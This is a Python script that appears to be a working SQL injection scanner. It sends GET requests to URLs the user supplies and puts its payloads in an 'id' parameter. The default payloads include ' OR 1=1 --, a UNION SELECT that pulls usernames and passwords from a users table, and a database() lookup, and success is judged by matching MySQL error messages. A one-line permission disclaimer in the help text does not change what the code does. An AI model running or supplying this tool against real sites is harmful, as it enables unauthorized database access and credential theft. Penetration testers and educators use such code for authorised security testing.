import requests
import logging
import argparse
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define the headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5"
}

def load_payloads(file_path):
    """Load payloads from a specified file."""
    try:
        with open(file_path, 'r') as file:
            payloads = [line.strip() for line in file if line.strip()]
        logging.info(f"Loaded {len(payloads)} payloads from {file_path}.")
        return payloads
    except Exception as e:
        logging.error(f"Error loading payloads from {file_path}: {e}")
        return []

def get_urls(args):
    """Get URLs from command line arguments or prompt the user."""
    if args.url:
        return [args.url]
    
    urls = []
    print("Enter URLs to test for SQL injection (type 'done' when finished):")
    while True:
        url = input("URL: ")
        if url.lower() == 'done':
            break
        urls.append(url)
    return urls

def show_help():
    """Display help information about the script."""
    help_text = """
    SQL Injection Testing Script
    -----------------------------
    This script tests specified URLs for SQL injection vulnerabilities using a set of predefined payloads.

    Commands:
    1. Enter URLs: Type in the URL of the web page you want to test for SQL injection. 
       Type 'done' when you have finished entering URLs.
    2. Help: Type 'help' at any prompt to see this help information again.
    
    How it works:
    - The script will send HTTP GET requests to the specified URLs with various SQL injection payloads.
    - It will analyze the server's response to determine if the injection was successful.
    - Results will be logged, indicating whether each payload succeeded or failed.

    Important:
    - Ensure you have permission to test the URLs you provide.
    - This script is for educational purposes only.
    """
    print(help_text)

def test_payload(url, payload):
    """Test a single payload against a given URL."""
    try:
        # Send the request with the payload
        response = requests.get(url, headers=headers, params={"id": payload}, timeout=5)
        
        # Check if the payload was successful based on common error messages
        if any(error in response.text for error in ["You have an error in your SQL syntax", "SQL syntax", "mysql_fetch_array"]):
            logging.info(f"SQL injection successful on {url} with payload: {payload}")
        else:
            logging.info(f"SQL injection failed on {url} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request to {url} failed: {e}")

def main():
    """Main function to run the SQL injection tests."""
    parser = argparse.ArgumentParser(description='SQL Injection Testing Script')
    parser.add_argument('-u', '--url', type=str, help='Specify a URL to test for SQL injection.')
    parser.add_argument('-p', '--payloads', type=str, help='Specify a file path to a custom payloads.txt file.')
    args = parser.parse_args()
    
    show_help()  # Show help information at the start

    # Load custom payloads if specified, otherwise use default payloads
    if args.payloads:
        payloads = load_payloads(args.payloads)
    else:
        payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' UNION SELECT NULL, username, password FROM users --",
            "' OR 'x'='x",
            "' AND 1=2 UNION SELECT NULL, database(), NULL --"
        ]
    
    urls = get_urls(args)
    
    # Use ThreadPoolExecutor to run tests concurrently for each URL
    with ThreadPoolExecutor(max_workers=5) as executor:
        for url in urls:
            executor.map(lambda payload: test_payload(url, payload), payloads)

if __name__ == "__main__":
    main()
